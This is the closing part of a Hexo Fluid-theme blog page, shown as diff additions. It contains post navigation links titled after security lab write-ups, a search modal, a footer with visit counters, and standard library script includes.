+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">迷糊的提权方式以及利用ssrf到最终提权靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/30/%E7%BA%A2%E6%97%A57/">
+                        <span class="hidden-mobile">红日7</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
